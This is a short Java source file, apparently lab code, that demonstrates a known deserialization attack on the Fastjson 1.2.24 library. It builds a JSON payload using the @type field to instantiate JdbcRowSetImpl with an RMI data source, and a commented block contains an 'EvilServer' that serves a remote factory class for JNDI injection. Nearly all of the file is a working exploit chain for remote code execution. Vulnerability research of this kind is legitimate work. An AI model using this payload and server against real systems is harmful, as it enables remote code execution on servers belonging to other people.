package FastJson1224VULN.TemplatesImplBasedATTACK;

import com.alibaba.fastjson.JSON;
import com.sun.rowset.JdbcRowSetImpl;

public class JDBCRowImplBasedEXP {
    public static void main(String[] args) throws Exception {
        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
//        jdbcRowSet.setDataSourceName("rmi://localhost:1099/remoteObj");
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/remoteObj\", \"autoCommit\":true}";
        JSON.parse(payload);
        // JNDIServer must use ref!!!
        /*
        package JNDIInjection;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;
import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;

public class EvilServer {
    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
        Context ctx = new InitialContext();
        Reference ref = new Reference(
          "calc",
          "JNDIInjection.EvilFactory", // full restricted!!!
                "http://localhost:8888/"
        );
        ctx.rebind("rmi://localhost:1099/remoteObj",ref);

        System.out.println("Evil server is running...");

    }
}

         */

    }
}
